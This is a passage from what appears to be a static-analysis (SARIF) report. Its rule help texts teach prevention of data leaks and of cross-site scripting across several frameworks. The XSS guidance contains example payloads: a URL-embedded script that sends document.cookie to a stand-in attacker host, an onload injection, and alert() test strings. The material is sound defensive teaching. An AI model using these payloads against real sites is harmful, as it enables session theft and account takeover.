header in your `gunicorn.conf.py` config \nfile:\n\n```python\nimport gunicorn\n\n# Make the server name completely generic.\ngunicorn.SERVER_SOFTWARE = 'Server'\n```\n\n:::\n\n:::tab[Scala]\n\n## How to Prevent Data Leaks in Scala\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. Notice how the Play framework uses different error\npages in development and production modes:\n\n```scala\n  /**\n   * Invoked in dev mode when a server error occurs.\n   */\n  protected def onDevServerError(request: RequestHeader, exception: UsefulException): Future[Result] = {\n    Future.successful {\n      implicit val ir: RequestHeader = request\n      InternalServerError(views.html.defaultpages.devError(playEditor, exception))\n    }\n  }\n\n  /**\n   * Invoked in prod mode when a server error occurs.\n   */\n  protected def onProdServerError(request: RequestHeader, exception: UsefulException): Future[Result] =\n    Future.successful {\n      implicit val ir: RequestHeader = request\n      InternalServerError(views.html.defaultpages.error(exception))\n    }\n```\n\nThe default error page only contain a generic error message (e.g. \"An error occurred\"), whereas the development-mode\nerror page will log full stack traces.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the \nuser. Here a generic error message is shown to the user, while the detailed error is written to the logs for investigation:\n\n```scala\n  override def onServerError(request: RequestHeader, exception: Throwable): Future[Result] = {\n    try {\n      val usefulException = HttpErrorHandlerExceptions.throwableToUsefulException(sourceMapper, !config.showDevErrors, exception)\n\n      // Write the full error context and stack trace to the log file.\n      logServerError(request, usefulException)\n\n      // Sanitize the error to be displayed to the user, when in production-mode.\n      if (config.showDevErrors) onDevServerError(request, usefulException)\n      else onProdServerError(request, usefulException)\n    } catch {\n      case NonFatal(e) =>\n        logger.error(\"Error while handling error\", e)\n        Future.successful(InternalServerError(fatalErrorMessage(request, e)))\n    }\n  }\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. In the Play framework, static assets like JavaScript and CSS files are \ntypically kept in a separate `/public` and mapped in the routes file as follows:\n\n```scala\nGET  /assets/*file        controllers.Assets.at(path=\"/public\", file)\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. For example, the Akka web-server allows you to disable these headers through configuration options:\n\n```\nakka.http {\n  server {\n    # The default value of the `Server` header to produce if no\n    # explicit `Server`-header was included in a response.\n    # If this value is the empty string and no header was included in\n    # the request, no `Server` header will be rendered at all.\n    server-header = \"\" # akka-http/${akka.http.version}\n  }  \n}\n```\n\n:::\n\n:::tab[Go]\n\n## How to Prevent Data Leaks in Go\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. In Go web applications, you typically end up writing\nyour own error pages. Ensure that any pages that handle errors pay use flags to distinguish the environment they are \nexecuting in:\n\n```go\nimport \"flag\"\n\nvar debug = flag.Bool(\"debug\", false, \"Whether to show full error messages on the client\")\n```\n\nA default error page only contain a generic error message (e.g. \"An error occurred\"), whereas the development-mode\nerror page can show more information, like full stack traces.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the \nuser. Go functions typically return error codes when then fail, and web handlers will return early when error conditions \noccur. Ensure such code does not leak sensitive system data.\n\n```go\nsession, err := session.Get(request, \"session\")\n\nif err != nil {\n  // The second argument here is returned directly to the client, which leaks information!\n  http.Error(response, err.Error(), http.StatusInternalServerError)\n  return\n}\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. Here's how to specify the directory containing static files (like JavaScript \ncode and images) in the Gorilla web framework:\n\n```go\nfunc main() {\n  var dir string\n\n  flag.StringVar(&dir, \"dir\", \".\", \"the directory to serve files from. Defaults to the current dir\")\n  flag.Parse()\n  router := mux.NewRouter()\n\n  // This will serve files under http://localhost:8000/static/<filename>\n  router.PathPrefix(\"/static/\").Handler(http.StripPrefix(\"/static/\", http.FileServer(http.Dir(dir))))\n\n  server := &http.Server{\n    Handler: router,\n    Addr:    \"127.0.0.1:8000\"\n  }\n\n  log.Fatal(server.ListenAndServe())\n}\n```\n\n:::\n\n:::tab[PHP]\n\n## How to Prevent Data Leaks in PHP\n\n### Keep Error Reporting on the Server\n\nDisable error reporting to the client in your production environment by setting the `display_errors` directive to `Off` in your `php.ini`:\n\n```ini\ndisplay_errors = Off\n```\n\nYou should instead log the errors for review. Ensure that `log_errors` directive is set to `On`:\n\n```ini\nlog_errors = On\nerror_log = /path/to/php-error.log\n```\n\n### Sanitize Error Messages\n\nAvoid directly echoing out database or system error messages to the user. Instead, present a generic message while logging the exact error for debugging:\n\n```php\ntry \n{\n    $result = $db->query(\"SELECT * FROM users WHERE email = '$email'\");\n}\ncatch (PDOException $e) \n{\n    error_log(\"Database error: \" . $e->getMessage());\n    echo \"An unexpected error occurred, please try again later.\";\n}\n```\n\n### Separate Dynamic and Static Resources\n\nFor websites or web applications using PHP, it's common to store PHP files in one directory and static resources (e.g., images, stylesheets, and JavaScript files) in separate directories. This way, you can use server configurations to ensure direct access to PHP files is restricted.\n\n### Hide PHP Version Information\n\nThe `X-Powered-By` header can give away the PHP version you're running. To hide this:\n\n1. Edit `php.ini` and update:\n\n```ini\nexpose_php = Off\n```\n\nOr, if you're using an `.htaccess` file on an Apache server:\n\n```apache\nHeader unset X-Powered-By\n```\n\n### Be Careful With Comments\n\nAvoid leaving sensitive or internal-only comments in your PHP files. Even if you think they are in a part of the code that doesn't output to the user, mistakes or changes in the codebase could expose them. Always assume that anything in a code file could potentially be exposed.\n\n:::\n\n::::\n\n## Further Considerations\n\n* Ensure any comments in template files don't contain sensitive data! It's easy to leave in notes about server names\n  and addresses that will get passed to the client-side. Attackers know this, and will scan comments in HTML for IP\n  addresses and URLs.\n  \n* Ensure server-side log messages do not contain sensitive information like passwords or credit card numbers - this \n  should mitigate the harm an attacker can do if they manage to steal your server's log files.\n  \n\n## Additional information\n\n**[CWE-200](https://cwe.mitre.org/data/definitions/200.html)**\n\n**[OWASP-A3](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A3-Sensitive_Data_Exposure)**"
                            },
                            "helpUri": "https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A3-Sensitive_Data_Exposure",
                            "id": "sensitive-to-log/f742f3b20eb30dc8fb480274cf7f3138",
                            "name": "Sensitive Data Leak: Sensitive Data Is Leaked To Log In Order.js:processcc.<Lambda>1",
                            "properties": {
                                "precision": "very-high",
                                "security-severity": "8",
                                "tags": [
                                    "ng-sast",
                                    "CVSS 8",
                                    "CWE 117",
                                    "CWE 200",
                                    "OWASP 2021 a01-broken-access-control",
                                    "OWASP a01-2021-broken-access-control",
                                    "OWASP a3-sensitive-data-exposure",
                                    "Sensitive Data Leak"
                                ]
                            },
                            "shortDescription": {
                                "text": "Sensitive Data Leak: Sensitive Data is Leaked to Log in Order.js:processCC.<lambda>1"
                            }
                        },
                        {
                            "defaultConfiguration": {
                                "enabled": true,
                                "level": "error",
                                "rank": -1
                            },
                            "fullDescription": {
                                "text": "This HTML content is not a string literal. When unescaped attacker-controlled inputs are used as part of HTML content this indicates a Cross-Site Scripting vulnerability."
                            },
                            "help": {
                                "markdown": "This HTML content is not a string literal. When unescaped attacker-controlled inputs are used as part of HTML content this indicates a Cross-Site Scripting vulnerability.\n\n# Cross-Site Scripting\n\nA **Cross-site scripting** (XSS) vulnerability allows an attacker to execute\nJavaScript code in an HTML document rendered by a victim. As a result, the\nattacker can then for example impersonate the victim user to perform arbitrary actions\nprovided by the web application, or exfiltrate and modify sensitive data that is otherwise only accessible to the victim.\n\n## Anatomy of an XSS Attack\n\nThe nature of web applications requires them to process and handle HTML content, which often dynamically incorporates external data. Applications must correctly escape or sanitize all such dynamic content to prevent **XSS attacks**. The most common types of XSS vulnerabilities are:\n\n### Reflected XSS\n\nReflected Cross-Site scripting attack happens in multiple steps:\n\n1. An attacker gets a victim to send data of the attacker's choosing to a website - for example by redirecting them to a URL of\n   the attacker's choosing.\n2. The application includes this untrusted data in an HTML document it sends in response (*reflecting* the data), without taking correct steps to disarm it.\n3. The victim's browser executes JavaScript code of the attacker's choosing.\n\nAs an example let's take a web application that displays the contents of the `search` query parameter in the URL. When an attacker sends a link to a victim to get them to visit a URL like\n\n    https://your-website.invalid/?search=<script>location.href=\"https://attacker-owned.invalid/?\"+document.cookie</script>\n\nIf the HTML response contains this `<script>` tag as-is and the victim clicks on the link, the victim's browser executes this JavaScript code. The JavaScript snippet in this example sends the victim's cookies on your website back to the attacker - on many sites that allows the attacker to take over the active log-in of the victim and impersonate them.\n\n\n### Stored XSS\n\nA Stored Cross-Site Scripting vulnerability happens when the following things come together:\n\n1. An application persists / stores untrusted data, for example in a database. An attacker gets the application to store some HTML and JavaScript code.\n2. The application later retrieves this stored data and includes it as part of an HTML document. (And the application does not take correct steps to disarm the attacker-controlled data.)\n3. A victim views such an HTML page. Their browser executes the attacker-chosen JavaScript code.\n\nFor example, a social-network type website may allow users to set the avatar that is displayed next to their name on their profile or next to their posts to an arbitrary URL of an image file. This website stores this URL in a database and includes the URL as-is in an HTML tag `<img src=\"...\">`. An attacker with user-id `1337` specifies this URL for their avatar:\n\n    https://somewhere.invalid/their-picture.jpg\" onload=\"addUserToFriendsList(1337)\n\nto get the application to generate this resulting HTML code:\n\n```html\n<img src=\"https://somewhere.invalid/their-picture.jpg\" onload=\"addUserToFriendsList(1337)\">\n```\n\nWhenever someone looks at the profile of the attacker, their browser executes the JavaScript code that adds the attacker to the victim's friend list without further user interaction.\n\n\n### DOM-Based XSS\n\nWith **DOM-based XSS vulnerabilities** the HTML code that is generated in the backend is safe by itself. Instead, the vulnerability is in JavaScript frontend code that inserts untrusted data into the browser **Document Object Model** (DOM) in an insecure manner.\n\nA **DOM-based XSS vulnerability** can be either **reflected** or **stored** - depending on how the untrusted data is transmitted by an attacker.\n\nWe can revisit the social-network example for **stored XSS** - a site that uses a JavaScript snippet like this would be vulnerable to the same attack:\n\n```javascript\n$.get(\"user/1337/profile\", res => $(\"#avatar\").html(`<img src=\"${res.avatarURL}\">`));\n```\n\n(This snippet performs an HTTP GET request to request the user's profile information. It insecurely includes the result when rendering a snippet of HTML.)\n\n### Cross-Site Scripting Beside the Web\n\nApplications that are not websites at all still often use HTML (or related technologies that are also susceptible to XSS) to display formatted text to users - whether they are mobile applications, desktop applications or embedded. These applications must be just as careful when including dynamic data in the HTML they generate.\n\nIn fact, the impact of an XSS attack against such applications is often even more disastrous. The HTML views such applications use are generally not meant to protect the application or user against malicious JavaScript. Instead, they have powerful non-standard JavaScript APIs that can allow an attacker to take complete control of the application and computer.\n\nThere are endless potential scenarios for such problems. Here are some examples to spark your imagination:\n\n- a messenger app executing scripts within messages from other users\n- an ebook reader executing JavaScript from code samples in a book about JavaScript\n- a Wi-Fi network selection list names executing scripts from the name of access points\n\nThe root problem is the same as for websites - whenever you include dynamic content in HTML and the source of this dynamic data cannot be trusted 100%, XSS attacks can happen. And on the flip-side, the same techniques and best practices protect against such vulnerabilities.\n\n## Preventing XSS Attacks\n\nThere are multiple approaches to prevent XSS attacks.\n\nBest practice is to use **secure-by-default web frameworks and templating engines** for generating or modifying HTML. For these you only need to think about the possibility of a XSS vulnerability because data is not fully trusted in the places where explicitly output raw HTML.\n\nThe next-best option is to manually HTML-**escape** all dynamic data that you include in an HTML document. This approach is secure in principle but has several downsides:\n\n- it is easy to forget to escape some untrusted data - even if you remember to do it correctly *almost* everywhere\n- untrusted inputs can take very long-winded paths before getting output again - a developer just needs to overlook one such path to fool themselves to think escaping is not needed when it actually is\n- it violates the don't-repeat-yourself (DRY) principle, requiring boilerplate code in every place an application adds dynamic data to HTML content\n\nWhen you decide to use escaping, be wary of when you escape data from untrusted inputs: subsequent encoding, decoding or other text manipulation operations on already-escaped strings can inadvertently reintroduce some way for an attacker to thwart the protection from that earlier HTML-escaping operation - it is therefore generally best to wait until the last possible moment to do HTML-escaping.\n\nSometimes you have text that is not fully trusted and is already in HTML format. The previous options do not work in that case. Instead, you need to **sanitize** the HTML so that benign HTML formatting is passed through but nothing that can be abused by an attacker. This should be an **option of last resort**. Attackers regularly come up with novel ways to render sanitization useless. If you do go with it, we have a few tips:\n\n- Use a well-known HTML sanitization library! There are many non-obvious ways HTML can contain JavaScript code. Do not believe you know and remember of all of them.\n- Rigorously keep up with updates for the HTML sanitizer you use! Updates will often fix ways attackers can bypass the sanitization, or add support for some new browser features that in some way can lead to JavaScript execution.\n- Be as restrictive as possible! HTML sanitization libraries can generally be configured as to which HTML constructs should be allowed and which should not. Give attackers as little wiggle-room to find a way around the sanitization as possible.\n- Use mitigations for Cross-Site Scripting from the next section.\n\n\n## Mitigating Cross-Site Scripting Attacks\n\nThere are several things you can do to lower the impact of XSS vulnerabilities but not quite to the point of solving the problem completely. You should not rely on them as sole protection, yet they are a useful defense-in-depth measure in case something goes wrong.\n\nYou can use the `Content-Security-Policy` (CSP) HTTP header to instruct browsers not to execute JavaScript code except in places you explicitly allow. A restrictive **Content Security Policy** is effective in stopping XSS attacks in otherwise vulnerable websites. But sufficiently restrictive policies also disable many useful features of the web platform. As a result, policies seen in practice often still allow some subset of attacks to go through. Try to remain as strict as possible in what you allow in your **content security policies**.\n\nWhen you know you show HTML content to users that you do not fully trust (e.g. you used sanitization or sourced it from a partner company), consider loading it within an `<iframe>` with the `sandbox` attribute. This attribute allows you to instruct the browser to disable various dangerous features and allows you to limit the ways content inside the **sandbox** can interact with your regular site. \n\nXSS filters in browsers, middleware or application firewalls have severe limitations. They can provide some protection against well-known exploits in off-the-shelf software. But attackers regularly find ways to bypass these tools. Most browsers have removed or never implemented builtin XSS filters because there actually are cases where they create vulnerabilities in sites that are otherwise secure. Similar problems fundamentally also apply to server-side filters when they don't just block possible exploit attempts but are supposed to neutralize them.\n\n\n::::tabs\n\n:::tab[Java]\n\n## XSS Protection in JSP\n\nJava Server Pages (JSP) do **not** protect against Cross-Site Scripting by default. The following example is vulnerable to XSS attacks if users can freely choose their names:\n\n```html\n<h1>Hello, ${user.name}</h1><!-- bad: users can inject HTML code here -->\n```\n\nInstead, in JSP you must use one of these two more verbose ways to output dynamic data in order to prevent XSS attacks:\n\n```html\n<%@ taglib uri=\"http://java.sun.com/jsp/jstl/core\" prefix=\"c\" %>\n<h1>Hello, <c:out value=\"${user.name}\"/></h1>\n```\n\n```html\n<%@ taglib uri=\"http://java.sun.com/jsp/jstl/functions\" prefix=\"fn\" %>\n<h1>Hello, ${fn:escapeXml(user.name)}</h1>\n```\n\nNote that a lot of information from the JSP and servlet context is attacker-controlled, so don't forget to escape this data.\n\n## XSS Protection in Regular Java\n\nIf your code manually constructs HTML (e.g. in a servlet) you need to escape any dynamic content before writing it. For example, you may use \n`org.apache.commons.lang.StringEscapeUtils.escapeHtml()` method from the Apache \n`commons-lang` library or the `org.springframework.web.util.HtmlUtils` class from the Spring framework for that purpose.\n\n:::\n\n:::tab[Angular]\n\n## XSS Protection in Angular\n\nAngular is safe by default and escapes all dynamic values automatically. The\nexception are the `bypassSecurityTrust*` functions in the `DomSanitizer` object.\nCarefully audit every use of these functions to make sure they are not used with\nuntrusted input.\n\nUsing these functions with untrusted data immediately opens the door to XSS\nattacks:\n\n```typescript\nimport { Component, OnInit } from '@angular/core';\nimport {DomSanitizer} from '@angular/platform-browser'\n\n@Component({\n  selector: 'component-with-dom-sanitizer',\n  template: '<div [innerHTML]=\"html\"></div>', // include HTML content from 'this.html'\n})\nexport class ComponentWithDomSanitizer implements OnInit {\n  html: SafeHtml;\n\n  constructor(private sanitizer: DomSanitizer) {}\n\n  ngOnInit(): void {\n    // never use with untrusted/partially trusted input!\n    // if you are uncertain, prefer this.sanitizer.sanitize()\n    this.html = this.sanitizer.bypassSecurityTrustHtml('<img src=\"broken\" onerror=\"alert(\\'Hello XSS!\\')\">') ;\n  }\n}\n```\n\n:::\n\n:::tab[C#]\n\n## XSS Protection in C#\n\nThe Razor template language escapes dynamic content automatically when using the @ symbol for interpolation. The following snippet writes out the untrusted input as `&lt;&quot;script&quot;&gt;` when rendering the HTML, safely defusing any\npotential XSS attacks:\n\n```html\n@{\n    var untrustedInput = \"<\\\"script\\\">\";\n}\n\n<h1>@untrustedInput</h1>\n```\n\nThis can be overridden using the `Html.Raw()` method - opening up the possibility of XSS attacks:\n\n```html\n<!-- this is vulnerable to XSS -->\n<div data-url=\"@Html.Raw(untrustedInput)\"></div>\n```\n\nCarefully audit every use of `Html.Raw()` to make sure it is not used with untrusted data.\n\n### Manual Escaping\n\nIf you are constructing HTML outside a template you must remember to manually\nHTML-escape dynamic data. One option for this is the `System.Web.HttpUtility.HtmlEncode()` method.\n\n:::\n\n:::tab[Go]\n\n## XSS Protection in Go\n\nThe `html/template` package is safe by default, automatically escaping dynamic content. For example, the following snippet:\n\n```go\nimport \"html/template\"\n\nt, err := template.New(\"template\").Parse(`{{define \"T\"}}Hello, {{.}}!{{end}}`)\nerr = t.ExecuteTemplate(out, \"T\", \"<script>alert('Hacked!')</script>\")\n```\n\n...writes escaped HTML to the `out` variable. This is in contrast to the `text/template` package which does not provide\nsuch protection.\n\n### Manual Escaping\n\nIf you are constructing HTML outside a template you must remember to manually\nHTML-escape dynamic data. You can use the `html/template.HTMLEscapeString()` function\nfor this.\n\n:::\n\n:::tab[JavaScript]\n\n## XSS Protection in JavaScript\n\nMany template languages escape dynamic content by default, unless you add a directive telling them not to. For instance,\nthe Nunjucks\ntemplate language automatically escapes anything between curly braces:\n\n```\n<!-- Will print &lt;script&gt; in the HTML. -->\n{{ \"<script>\" }}\n```\n\nThis behavior can be overridden, however, creating the possibility of vulnerabilities. In Nunjucks, one way\nof doing this are by using the `safe` keyword (which tells the template engine you consider the source trustworthy):\n\n```\n<!-- Will print <script> in the HTML, which is not safe! -->\n{{ \"<script>\" | safe }}\n```\n\nAnother way such templates become vulnerable is when HTML-escaping is disabled globally:\n\n```javascript\n// bad: this asks for your app to be vulnerable to XSS attacks\nnunjucks.configure({ autoescape: false });\n```\n\n### Manual Escaping\n\nIf your code manually constructs HTML strings you need to escape any dynamic\ncontent manually. One way of doing this by using the `escape-html` Node module:\n\n```javascript\nconst escape = require('escape-html')\nconst html   = escape('<script>')     // Will return &lt;script&gt;\n```\n\n:::\n\n:::tab[Python]\n\n## XSS Protection in Python\n\nMost Python template languages escape dynamic content by default unless you add a directive telling them not to. For instance,\nJinja2 template language automatically escapes anything between curly braces:\n\n```\n<!-- Will print &lt;script&gt; in the HTML. -->\n{{ \"<script>\" }}\n```\n\nTemplate languages allow this behavior to be overridden, however, which can create an XSS vulnerability. In Jinja2, this is done with the `safe` keyword (which tells the template engine you consider the source trustworthy):\n\n```\n<!-- Will print <script> in the HTML, which is not safe! -->\n{{ \"<script>\" | safe }}\n```\n\nAnother way your templates can become vulnerable is by adding the `{% autoescape false %}` directive, which disables escaping for the whole template. Avoid using it.\n\n\n### Manual Escaping\n\nIf your code manually constructs HTML strings, you are responsible for escaping any\ndynamic content possibly coming from an untrusted source. In Python, the builtin `html` module provides the `escape()` function for this purpose:\n\n```python\nimport html\n\n# Will return &lt;script%gt;\nhtml.escape(\"<script>\")\n```\n\n:::\n\n:::tab[React]\n\n## XSS Protection in React\n\nBy default, React escapes any dynamic content you use to construct elements. For example, if some malicious\nJavaScript is passed in the malicious query string parameter, the following snippet is *still* safe:\n\n```jsx\nimport useSearchParams from 'react-router-dom'\n\nfunction SearchBar() {\n  const [searchParams, setSearch] = useSearchParams();\n  const searchParam = searchParams.get(\"search\");\n  \n  return (\n    <input type=\"text\" value={search} onChange={updateSearch} className=\"search-bar\" />\n  );\n}\n```\n\nTo disable auto-escaping in React, you would use the property `dangerouslySetInnerHTML`. Only use this with fully trusted or already HTML-escaped data, or your application is vulnerable to XSS attacks.\n\n```jsx\n<div className=\"search-bar\">\n  <!-- vulnerable! -->\n  <div dangerouslySetInnerHTML={{ __html: searchParam }}>\n  </div>\n</div>\n```\n\n\n:::\n\n:::tab[Scala]\n\n## XSS Protection in Scala\n\nMost template languages in Scala escape dynamic content by default. The popular Play framework escapes dynamic\ncontent by default when you use the following form:\n\n```html\n<p>\n  @(article.content)\n</p>\n```\n\nYou can opt out of this protection by using `@Html()`. Due to the dangers of XSS vulnerabilities, carefully audit every use to ensure the data comes from a trusted source or is HTML-escaped in another step.\n\n```html\n<p>\n  <!-- dangerous! -->\n  @Html(article.content)\n</p>\n```\n\n### Manual Escaping\n\nIf your code manually constructs HTML strings you need to escape any dynamic\ncontent before you write it to the output stream. If you use the play framework you can use the `play.api.templates.HtmlFormat.escape()` method for this. Other options are the\n`org.apache.commons.lang.StringEscapeUtils.escapeHtml()` method from the Apache\n`commons-lang` library or the `org.springframework.web.util.HtmlUtils` class from the Spring framework.\n\n\n:::\n\n:::tab[PHP]\n\n## XSS Protection in PHP\n\nIn PHP, HTML is not escaped by default, making it susceptible to Cross-Site Scripting attacks if proper measures are not taken. Below is a simple example demonstrating how one might inadvertently allow for XSS:\n\n```php\n<?php\n$userName = $_GET['username'];\n?>\n<h1>Hello, <?=$userName?></h1> <!-- bad: users can inject HTML or JavaScript here -->\n```\n\nBy directly echoing user input, you expose yourself to potential XSS vulnerabilities. A common string to show that an attack is possible is: `<script>alert('XSS!');</script>`\n\n### Mitigation\n\nIdeally, use a templating engine or frontend framework that protect against XSS by default by requiring special syntax for raw HTML output. The builtin PHP templating has no such protections, but for example the Blade template engine from Laravel does.\n\nWhen you are dealing with legacy code that uses a template engine with insecure defaults, you must remember to manually escape any output that could potentially contain user-controlled data. This is highly discouraged because it is so easy to forget, or overlook an obscure way that attacker-controlled inputs can actually end up in dynamic output. Still, if you have to do it, the most basic way to do this in PHP is using the built-in `htmlspecialchars` function:\n\n```php\n<?php\n$userName = $_GET['username'];\n$safeUserName = htmlspecialchars($userName, ENT_QUOTES, 'UTF-8');\n?>\n<h1>Hello, <?=$safeUserName?></h1> <!-- safe: characters like < and > are converted to their HTML entities -->\n```\n\nBy using `htmlspecialchars`, the input string is made safe for displaying in HTML by converting characters like `<` and `>` into their respective HTML entities (`&lt;` and `&gt;`), preventing them from being interpreted as HTML or JavaScript by the browser.\n\nHowever, ensure you always use `htmlspecialchars` or similar functions whenever you're outputting data that might contain user input, not just in this specific context. Also, use context-aware output functions when working with JavaScript, CSS, or URL parameters to prevent XSS in those contexts.\n\nRemember, avoiding XSS is not only about protecting against `<script>` tags, but also about preventing attackers from manipulating HTML in ways that can lead to data theft, defacement, or other malicious activities.\n\n:::\n\n::::\n\n## CWEs\n\n* [CWE-79](https://cwe.mitre.org/data/definitions/79.html)",
                                "text": "This HTML content is not a string literal. When unescaped attacker-controlled inputs are used as part of HTML content this indicates a Cross-Site Scripting vulnerability.\n\n# Cross-Site Scripting\n\nA **Cross-site scripting** (XSS) vulnerability allows an attacker to execute\nJavaScript code in an HTML document rendered by a victim. As a result, the\nattacker can then for example impersonate the victim user to perform arbitrary actions\nprovided by the web application, or exfiltrate and modify sensitive data that is otherwise only accessible to the victim.\n\n## Anatomy of an XSS Attack\n\nThe nature of web applications requires them to process and handle HTML content, which often dynamically incorporates external data. Applications must correctly escape or sanitize all such dynamic content to prevent **XSS attacks**. The most common types of XSS vulnerabilities are:\n\n### Reflected XSS\n\nReflected Cross-Site scripting attack happens in multiple steps:\n\n1. An attacker gets a victim to send data of the attacker's choosing to a website - for example by redirecting them to a URL of\n   the attacker's choosing.\n2. The application includes this untrusted data in an HTML document it sends in response (*reflecting* the data), without taking correct steps to disarm it.\n3. The victim's browser executes JavaScript code of the attacker's choosing.\n\nAs an example let's take a web application that displays the contents of the `search` query parameter in the URL. When an attacker sends a link to a victim to get them to visit a URL like\n\n    https://your-website.invalid/?search=<script>location.href=\"https://attacker-owned.invalid/?\"+document.cookie</script>\n\nIf the HTML response contains this `<script>` tag as-is and the victim clicks on the link, the victim's browser executes this JavaScript code. The JavaScript snippet in this example sends the victim's cookies on your website back to the attacker - on many sites that allows the attacker to take over the active log-in of the victim and impersonate them.\n\n\n### Stored XSS\n\nA Stored Cross-Site Scripting vulnerability happens when the following things come together:\n\n1. An application persists / stores untrusted data, for example in a database. An attacker gets the application to store some HTML and JavaScript code.\n2. The application later retrieves this stored data and includes it as part of an HTML document. (And the application does not take correct steps to disarm the attacker-controlled data.)\n3. A victim views such an HTML page. Their browser executes the attacker-chosen JavaScript code.\n\nFor example, a social-network type website may allow users to set the avatar that is displayed next to their name on their profile or next to their posts to an arbitrary URL of an image file. This website stores this URL in a database and includes the URL as-is in an HTML tag `<img src=\"...\">`. An attacker with user-id `1337` specifies this URL for their avatar:\n\n    https://somewhere.invalid/their-picture.jpg\" onload=\"addUserToFriendsList(1337)\n\nto get the application to generate this resulting HTML code:\n\n```html\n<img src=\"https://somewhere.invalid/their-picture.jpg\" onload=\"addUserToFriendsList(1337)\">\n```\n\nWhenever someone looks at the profile of the attacker, their browser executes the JavaScript code that adds the attacker to the victim's friend list without further user interaction.\n\n\n### DOM-Based XSS\n\nWith **DOM-based XSS vulnerabilities** the HTML code that is generated in the backend is safe by itself. Instead, the vulnerability is in JavaScript frontend code that inserts untrusted data into the browser **Document Object Model** (DOM) in an insecure manner.\n\nA **DOM-based XSS vulnerability** can be either **reflected** or **stored** - depending on how the untrusted data is transmitted by an attacker.\n\nWe can revisit the social-network example for **stored XSS** - a site that uses a JavaScript snippet like this would be vulnerable to the same attack:\n\n```javascript\n$.get(\"user/1337/profile\", res => $(\"#avatar\").html(`<img src=\"${res.avatarURL}\">`));\n```\n\n(This snippet performs an HTTP GET request to request the user's profile information. It insecurely includes the result when rendering a snippet of HTML.)\n\n### Cross-Site Scripting Beside the Web\n\nApplications that are not websites at all still often use HTML (or related technologies that are also susceptible to XSS) to display formatted text to users - whether they are mobile applications, desktop applications or embedded. These applications must be just as careful when including dynamic data in the HTML they generate.\n\nIn fact, the impact of an XSS attack against such applications is often even more disastrous. The HTML views such applications use are generally not meant to protect the application or user against malicious JavaScript. Instead, they have powerful non-standard JavaScript APIs that can allow an attacker to take complete control of the application and computer.\n\nThere are endless potential scenarios for such problems. Here are some examples to spark your imagination:\n\n- a messenger app executing scripts within messages from other users\n- an ebook reader executing JavaScript from code samples in a book about JavaScript\n- a Wi-Fi network selection list names executing scripts from the name of access points\n\nThe root problem is the same as for websites - whenever you include dynamic content in HTML and the source of this dynamic data cannot be trusted 100%, XSS attacks can happen. And on the flip-side, the same techniques and best practices protect against such vulnerabilities.\n\n## Preventing XSS Attacks\n\nThere are multiple approaches to prevent XSS attacks.\n\nBest practice is to use **secure-by-default web frameworks and templating engines** for generating or modifying HTML. For these you only need to think about the possibility of a XSS vulnerability because data is not fully trusted in the places where explicitly output raw HTML.\n\nThe next-best option is to manually HTML-**escape** all dynamic data that you include in an HTML document. This approach is secure in principle but has several downsides:\n\n- it is easy to forget to escape some untrusted data - even if you remember to do it correctly *almost* everywhere\n- untrusted inputs can take very long-winded paths before getting output again - a developer just needs to overlook one such path to fool themselves to think escaping is not needed when it actually is\n- it violates the don't-repeat-yourself (DRY) principle, requiring boilerplate code in every place an application adds dynamic data to HTML content\n\nWhen you decide to use escaping, be wary of when you escape data from untrusted inputs: subsequent encoding, decoding or other text manipulation operations on already-escaped strings can inadvertently reintroduce some way for an attacker to thwart the protection from that earlier HTML-escaping operation - it is therefore generally best to wait until the last possible moment to do HTML-escaping.\n\nSometimes you have text that is not fully trusted and is already in HTML format. The previous options do not work in that case. Instead, you need to **sanitize** the HTML so that benign HTML formatting is passed through but nothing that can be abused by an attacker. This should be an **option of last resort**. Attackers regularly come up with novel ways to render sanitization useless. If you do go with it, we have a few tips:\n\n- Use a well-known HTML sanitization library! There are many non-obvious ways HTML can contain JavaScript code. Do not believe you know and remember of all of them.\n- Rigorously keep up with updates for the HTML sanitizer you use! Updates will often fix ways attackers can bypass the sanitization, or add support for some new browser features that in some way can lead to JavaScript execution.\n- Be as restrictive as possible! HTML sanitization libraries can generally be configured as to which HTML constructs should be allowed and which should not. Give attackers as little wiggle-room to find a way around the sanitization as possible.\n- Use mitigations for Cross-Site Scripting from the next section.\n\n\n## Mitigating Cross-Site Scripting Attacks\n\nThere are several things you can do to lower the impact of XSS vulnerabilities but not quite to the point of solving the problem completely. You should not rely on them as sole protection, yet they are a useful defense-in-depth measure in case something goes wrong.\n\nYou can use the `Content-Security-Policy` (CSP) HTTP header to instruct browsers not to execute JavaScript code except in places you explicitly allow. A restrictive **Content Security Policy** is effective in stopping XSS attacks in otherwise vulnerable websites. But sufficiently restrictive policies also disable many useful features of the web platform. As a result, policies seen in practice often still allow some subset of attacks to go through. Try to remain as strict as possible in what you allow in your **content security policies**.\n\nWhen you know you show HTML content to users that you do not fully trust (e.g. you used sanitization or sourced it from a partner company), consider loading it within an `<iframe>` with the `sandbox` attribute. This attribute allows you to instruct the browser to disable various dangerous features and allows you to limit the ways content inside the **sandbox** can interact with your regular site. \n\nXSS filters in browsers, middleware or application firewalls have severe limitations. They can provide some protection against well-known exploits in off-the-shelf software. But attackers regularly find ways to bypass these tools. Most browsers have removed or never implemented builtin XSS filters because there actually are cases where they create vulnerabilities in sites that are otherwise secure. Similar problems fundamentally also apply to server-side filters when they don't just block possible exploit attempts but are supposed to neutralize them.\n\n\n::::tabs\n\n:::tab[Java]\n\n## XSS Protection in JSP\n\nJava Server Pages (JSP) do **not** protect against Cross-Site Scripting by default. The following example is vulnerable to XSS attacks if users can freely choose their names:\n\n```html\n<h1>Hello, ${user.name}</h1><!-- bad: users can inject HTML code here -->\n```\n\nInstead, in JSP you must use one of these two more verbose ways to output dynamic data in order to prevent XSS attacks:\n\n```html\n<%@ 